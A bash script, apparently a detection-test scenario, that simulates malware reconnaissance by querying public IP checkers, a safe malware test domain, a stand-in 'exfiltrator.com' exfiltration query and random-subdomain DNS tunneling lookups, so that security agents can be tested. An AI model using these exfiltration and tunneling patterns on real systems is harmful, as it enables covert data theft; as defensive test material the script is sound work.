#!/bin/bash

# ================================
# Scenario: Malicious DNS Lookup & Public IP Reconnaissance
# Type: Network
# Author: toquiwokey
# Description:
# - Simulates malware querying external DNS services to determine its 
#   public IP address or contact a C2 (Command & Control) server.
# - Uses a combination of public IP checkers and a safe test domain 
#   (malware.testing.google.test) to mimic real-world malware behavior.
# - Security agents should detect:
#   - Unexpected outbound DNS queries
#   - Suspicious HTTP/S requests to known reconnaissance services
#   - Potential DNS tunneling or exfiltration attempts
# ================================

# 📂 Define Log Directory & File
LOG_DIR="/var/log/nastycontainer/dns_recon"
LOG_FILE="$LOG_DIR/dns_recon.log"

# 🏗 Ensure the log directory exists
mkdir -p "$LOG_DIR"

# 📝 Redirect all stdout & stderr to both the log file and console
exec > >(tee -a "$LOG_FILE") 2>&1

echo "===== Starting Malicious DNS & Network Recon Scenario ====="

# 1️⃣ Public IP Reconnaissance (Simulates malware fingerprinting its external IP)
echo "[INFO] Checking public IP..."
echo "[INFO] Querying icanhazip.com..."
curl -s http://icanhazip.com
echo "[INFO] Querying checkip.amazonaws.com..."
curl -s http://checkip.amazonaws.com
echo "[INFO] Querying ifconfig.me..."
wget -qO- http://ifconfig.me
echo "[INFO] Querying OpenDNS Resolver..."
dig +short myip.opendns.com @resolver1.opendns.com

# 2️⃣ DNS Query to Safe Google Malware Test Domain
echo "[INFO] Querying Google's safe malware test domain..."
nslookup malware.testing.google.test
dig @8.8.8.8 malware.testing.google.test

# 3️⃣ DNS Exfiltration Simulation (Mimics malware stealing data over DNS)
echo "[INFO] Simulating DNS exfiltration..."
dig exampledata123.exfiltrator.com @8.8.8.8

# 4️⃣ DNS Tunneling Attempt (Mimics covert C2 communication)
echo "[INFO] Simulating DNS tunneling..."
for i in {1..5}; do 
    DIG_QUERY=$(openssl rand -hex 6).malware.testing.google.test
    echo "[INFO] Querying: $DIG_QUERY"
    dig "$DIG_QUERY" @8.8.8.8
done

echo "===== Scenario Completed, Logs Saved to $LOG_FILE ====="
